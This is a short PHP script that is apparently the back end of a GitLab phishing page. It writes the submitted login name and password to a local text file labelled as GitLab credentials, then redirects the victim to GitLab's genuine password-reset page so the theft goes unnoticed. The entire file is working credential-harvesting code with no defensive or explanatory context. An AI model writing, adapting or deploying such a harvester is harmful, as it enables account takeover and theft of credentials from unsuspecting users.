<?php

file_put_contents("usernames.txt", "Gitlab Username: " . $_POST['login'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://gitlab.com/users/password/new');
exit();
?>